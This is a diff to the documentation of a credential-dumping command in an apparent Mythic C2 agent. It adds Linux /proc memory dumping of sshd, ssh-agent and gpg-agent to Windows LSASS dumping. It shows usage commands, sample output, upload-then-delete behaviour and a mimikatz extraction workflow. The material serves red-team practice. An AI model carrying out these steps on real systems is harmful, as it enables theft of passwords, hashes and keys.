@@ -5,69 +5,101 @@ weight = 104
 hidden = false
 +++
 
-{{% notice info %}}
-Windows Only
-{{% /notice %}}
-
 ## Summary
 
-Dump process memory to a minidump file using the Windows `MiniDumpWriteDump` API from `dbghelp.dll`. The dump is automatically uploaded to Mythic via the file transfer system and deleted from disk immediately after upload.
+Dump process memory for offline credential extraction. Cross-platform:
 
-Two actions are available:
+- **Windows**: Uses `MiniDumpWriteDump` API from `dbghelp.dll` to create a standard minidump file. Supports automatic LSASS discovery.
+- **Linux**: Reads `/proc/<pid>/mem` using memory map regions from `/proc/<pid>/maps`. Dumps all readable private regions (heap, stack, anonymous mappings).
 
-- **lsass** — Automatically finds `lsass.exe` by process name and dumps its full memory. This is the primary use case for offline credential extraction (LSASS contains plaintext passwords, NTLM hashes, and Kerberos tickets).
-- **dump** — Dumps any process by PID. Useful for dumping other processes of interest.
+Dumps are automatically uploaded to Mythic via the file transfer system and deleted from disk immediately after upload.
+
+### Actions
+
+- **lsass** (Windows only) — Automatically finds `lsass.exe` by process name and dumps its full memory. Primary use case for offline credential extraction.
+- **dump** — Dumps any process by PID. Works on both Windows and Linux.
+- **search** (Linux only) — Scans `/proc` for processes commonly holding credentials (sshd, ssh-agent, gpg-agent, sudo, etc.) and reports their PID, owner, and estimated memory size.
 
 ### Requirements
 
-- **Administrator privileges** — SeDebugPrivilege is required to open protected processes
-- **SYSTEM token recommended** — Run `getsystem` first for maximum access
-- LSASS may be protected by **Protected Process Light (PPL)** on Windows 10/11, in which case the dump will fail with a clear error message suggesting alternatives
+**Windows:**
+- Administrator privileges — SeDebugPrivilege is required to open protected processes
+- SYSTEM token recommended — Run `getsystem` first for maximum access
+- LSASS may be protected by Protected Process Light (PPL)
+
+**Linux:**
+- Root or CAP_SYS_PTRACE capability to read other processes' memory
+- `/proc` filesystem must be mounted (standard on all Linux systems)
+- Yama ptrace scope may restrict access (`/proc/sys/kernel/yama/ptrace_scope`)
 
 ### Arguments
 
 #### action
-The dump type to perform. Default: `lsass`.
-- `lsass` — Auto-find and dump lsass.exe (no PID required)
-- `dump` — Dump a specific process by PID
+The dump type to perform.
+- `lsass` — (Windows) Auto-find and dump lsass.exe (no PID required)
+- `dump` — Dump a specific process by PID (both platforms)
+- `search` — (Linux) Find credential-holding processes
 
 #### pid
-Process ID to dump. Required for `dump` action, ignored for `lsass`.
+Process ID to dump. Required for `dump` action.
 
 ## Usage
+
+### Windows
 
 Dump LSASS (default):
 ```
 procdump
 ```
 
-Explicitly target LSASS:
+Dump a specific process:
 ```
-procdump -action lsass
+procdump -action dump -pid 1234
 ```
 
-Dump a specific process by PID:
+### Linux
+
+Find credential-holding processes:
+```
+procdump -action search
+```
+
+Dump a specific process:
 ```
 procdump -action dump -pid 1234
 ```
 
 ## Example Output
 
-### Successful LSASS Dump
+### Windows: Successful LSASS Dump
 ```
 Successfully dumped lsass.exe (PID 964)
 Dump size: 78.4 MB
 File uploaded to Mythic and cleaned from disk.
 ```
 
-### Successful Process Dump
+### Linux: Search Results
 ```
-Successfully dumped winlogon.exe (PID 3312)
-Dump size: 41.3 MB
-File uploaded to Mythic and cleaned from disk.
+Found 3 potential credential-holding processes:
+
+  PID 1042     sshd                  Owner: uid=0       Memory: 2.1 MB
+               Cmdline: /usr/sbin/sshd -D
+  PID 3456     ssh-agent             Owner: uid=1000    Memory: 512.0 KB
+               Cmdline: ssh-agent -D -a /run/user/1000/ssh-agent.socket
+  PID 7890     gpg-agent             Owner: uid=1000    Memory: 1.3 MB
+               Cmdline: /usr/bin/gpg-agent --supervised
+
+Use: procdump -action dump -pid <PID> to dump a specific process.
 ```
 
-### PPL Protected LSASS
+### Linux: Successful Process Dump
+```
+Successfully dumped sshd (PID 1042)
+Dump size: 2.1 MB (15 regions, 2 skipped)
+File uploaded to server and cleaned from disk.
+```
+
+### Windows: PPL Protected LSASS
 ```
 OpenProcess failed for PID 964 (lsass.exe): Access is denied.
 Possible causes:
@@ -79,12 +111,19 @@ Tip: Try 'getsystem' first, or dump a non-PPL process with -action dump -pid <PI
 
 ## Workflow
 
+### Windows
 1. Run `getsystem` to get SYSTEM token
 2. Run `procdump` (or `procdump -action lsass`)
 3. Download the dump from Mythic Files tab
 4. Analyze offline with `mimikatz` (`sekurlsa::minidump dump.dmp` then `sekurlsa::logonPasswords`)
-5. Run `rev2self` to drop SYSTEM privileges
+
+### Linux
+1. Ensure root access (or use `sudo`)
+2. Run `procdump -action search` to find interesting processes
+3. Run `procdump -action dump -pid <PID>` to dump a target
+4. Download the dump and search with `strings` or credential extraction tools
 
 ## MITRE ATT&CK Mapping
 
 - T1003.001 — OS Credential Dumping: LSASS Memory
+- T1003.007 — OS Credential Dumping: Proc Filesystem
